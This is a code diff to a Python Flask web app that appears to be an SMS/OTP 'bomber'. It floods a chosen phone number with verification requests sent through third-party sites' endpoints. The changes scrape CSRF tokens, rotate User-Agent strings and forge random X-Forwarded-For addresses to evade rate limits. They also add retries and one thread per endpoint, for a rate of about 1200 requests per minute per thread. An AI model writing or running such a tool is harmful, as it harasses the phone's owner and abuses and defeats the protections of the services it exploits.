@@ -42,7 +42,7 @@ def load_stats():
 requests_data = load_requests()
 stats_data = load_stats()
 bombing_active = False
-bombing_thread = None
+bombing_threads = []
 bombing_lock = threading.Lock()
 
 # ===== PANSHO SESSION REFRESH =====
@@ -50,18 +50,20 @@ def get_pansho_session():
     """Get fresh session for Pansho"""
     session = req_lib.Session()
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]),
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Accept-Encoding': 'gzip, deflate, br',
     }
     
     try:
-        # GET home page to get cookies and CSRF token
         resp = session.get('https://pansho.com/', headers=headers, timeout=10)
         soup = BeautifulSoup(resp.text, 'html.parser')
         
-        # Extract CSRF token
         token = None
         token_input = soup.find('input', {'name': '_token'})
         if token_input:
@@ -80,90 +82,89 @@ def get_pansho_session():
         print(f"❌ Pansho session failed: {e}")
         return None, None, None
 
-# ===== BOMBING ENGINE =====
-def bombing_worker(phone):
-    global bombing_active, stats_data
-    active_requests = [r for r in requests_data if r.get('active', True)]
-    
-    if not active_requests:
-        bombing_active = False
-        return
-    
-    # Pansho session cache
-    pansho_session = None
-    pansho_cookies = {}
-    pansho_token = None
-    
-    while bombing_active:
-        for req in active_requests:
-            if not bombing_active:
-                break
-            
-            # If Pansho, refresh session every 10 requests
+# ===== SEND REQUEST WITH RETRY =====
+def send_with_retry(req, phone, max_retries=3):
+    """Send request with retry on failure"""
+    for attempt in range(max_retries):
+        try:
+            # For Pansho, get fresh session each time
             if 'pansho' in req['name'].lower():
-                if not pansho_session or stats_data['total_requests'] % 10 == 0:
-                    pansho_session, pansho_cookies, pansho_token = get_pansho_session()
-                    if not pansho_session:
-                        time.sleep(1)
-                        continue
-            
-            # Phone variations
-            phone_variants = req.get('phones', [phone])
-            target_phone = random.choice(phone_variants) if phone_variants else phone
-            
-            # Build request
-            url = req['url'].replace('{phone}', target_phone)
-            headers = req['headers'].copy()
-            headers['User-Agent'] = random.choice([
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
-            ])
-            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            
-            try:
-                # Use session for Pansho, fresh for Testbook
-                if 'pansho' in req['name'].lower() and pansho_session:
-                    session = pansho_session
-                    # Update token in body
-                    body = req['body'].replace('{phone}', target_phone)
-                    body = body.replace('{token}', pansho_token)
-                    if req['method'] == 'POST':
-                        r = session.post(url, headers=headers, data=body, timeout=5)
+                session, cookies, token = get_pansho_session()
+                if not session:
+                    continue
+                headers = req['headers'].copy()
+                headers['User-Agent'] = random.choice([
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+                ])
+                body = req['body'].replace('{phone}', phone).replace('{token}', token)
+                r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
+            else:
+                # Testbook - fresh session
+                session = req_lib.Session()
+                headers = req['headers'].copy()
+                headers['User-Agent'] = random.choice([
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
+                ])
+                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                
+                if req['method'] == 'POST':
+                    if isinstance(req['body'], dict):
+                        r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=5)
                     else:
-                        r = session.get(url, headers=headers, timeout=5)
+                        body = req['body'].replace('{phone}', phone)
+                        r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
                 else:
-                    # Testbook or other - fresh request
-                    session = req_lib.Session()
-                    if req['method'] == 'POST':
-                        if isinstance(req['body'], dict):
-                            r = session.post(url, headers=headers, json=req['body'], timeout=5)
-                        else:
-                            body = req['body'].replace('{phone}', target_phone)
-                            r = session.post(url, headers=headers, data=body, timeout=5)
-                    else:
-                        r = session.get(url, headers=headers, timeout=5)
-                
-                with bombing_lock:
-                    stats_data['total_requests'] += 1
-                    if r.status_code in [200, 302, 201, 202]:
-                        stats_data['success'] += 1
-                    elif r.status_code == 429:
-                        stats_data['rate_limited'] += 1
-                    else:
-                        stats_data['failed'] += 1
+                    r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
+            
+            # Success
+            with bombing_lock:
+                stats_data['total_requests'] += 1
+                if r.status_code in [200, 302, 201, 202]:
+                    stats_data['success'] += 1
                     save_stats(stats_data)
-                
-                print(f"[{req['name']}] {r.status_code} | {target_phone}")
-                
-            except Exception as e:
-                with bombing_lock:
-                    stats_data['total_requests'] += 1
+                    return True
+                elif r.status_code == 429:
+                    stats_data['rate_limited'] += 1
+                    save_stats(stats_data)
+                    return False
+                else:
                     stats_data['failed'] += 1
                     save_stats(stats_data)
-                print(f"[{req['name']}] ERROR: {str(e)[:50]}")
-            
-            # 0.6 sec delay = 100 req/min per thread
-            time.sleep(0.6)
+                    return False
+                    
+        except Exception as e:
+            with bombing_lock:
+                stats_data['total_requests'] += 1
+                stats_data['failed'] += 1
+                save_stats(stats_data)
+            print(f"❌ Attempt {attempt+1} failed: {e}")
+            time.sleep(0.2)
+    
+    return False
+
+# ===== BOMBING WORKER =====
+def bombing_worker(phone, req):
+    """Worker thread for a single request type"""
+    global bombing_active
+    
+    # Phone variations
+    phone_variants = req.get('phones', [phone])
+    if not phone_variants:
+        phone_variants = [phone]
+    
+    while bombing_active:
+        target_phone = random.choice(phone_variants)
+        success = send_with_retry(req, target_phone)
+        
+        if success:
+            print(f"✅ {req['name']} | {target_phone}")
+        else:
+            print(f"❌ {req['name']} | {target_phone}")
+        
+        # Speed: 0.05 sec = 1200 req/min per thread
+        time.sleep(0.05)
 
 # ===== ROUTES =====
 
@@ -187,7 +188,7 @@ def get_stats():
 
 @app.route('/api/bomb/start', methods=['POST'])
 def start_bombing():
-    global bombing_active, bombing_thread, stats_data
+    global bombing_active, bombing_threads, stats_data
     
     data = request.json
     phone = data.get('phone')
@@ -202,16 +203,22 @@ def start_bombing():
     save_stats(stats_data)
     
     bombing_active = True
-    bombing_thread = threading.Thread(target=bombing_worker, args=(phone,))
-    bombing_thread.daemon = True
-    bombing_thread.start()
+    bombing_threads = []
     
-    active_count = sum(1 for r in requests_data if r.get('active', True))
+    # Start one thread per active request
+    active_requests = [r for r in requests_data if r.get('active', True)]
+    for req in active_requests:
+        t = threading.Thread(target=bombing_worker, args=(phone, req))
+        t.daemon = True
+        t.start()
+        bombing_threads.append(t)
+        print(f"✅ Thread started for {req['name']}")
+    
     return jsonify({
         "success": True,
         "message": f"Bombing started on {phone}",
         "phone": phone,
-        "active_requests": active_count
+        "active_requests": len(active_requests)
     })
 
 @app.route('/api/bomb/stop', methods=['POST'])
